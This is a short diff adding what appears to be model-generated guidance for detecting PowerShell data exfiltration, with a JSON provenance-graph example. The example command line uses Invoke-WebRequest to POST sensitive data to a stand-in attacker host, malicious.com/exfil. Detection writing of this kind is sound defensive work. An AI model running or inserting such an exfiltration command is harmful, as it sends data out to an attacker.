@@ -1,0 +1,21 @@
+<output>
+1. **Identify Data Exfiltration via PowerShell**  
+   - Monitor for events where the `srcNode` is a PowerShell process.  
+   - Set the `dstNode` to reflect the command and control server, specifically targeting the URI "http://malicious.com/exfil".  
+   - Ensure the `relation` is set to "Process Create" for the PowerShell process.  
+   - Example:  
+     ```json
+     {
+       "srcNode": {
+         "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+         "Cmdline": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command Invoke-WebRequest -Uri http://malicious.com/exfil -Method POST -Body \"sensitive_data\"",
+         "Type": "Process"
+       },
+       "dstNode": {
+         "Name": "http://malicious.com/exfil",
+         "Type": "Network"
+       },
+       "relation": "Process Create"
+     }
+     ```
+</output>
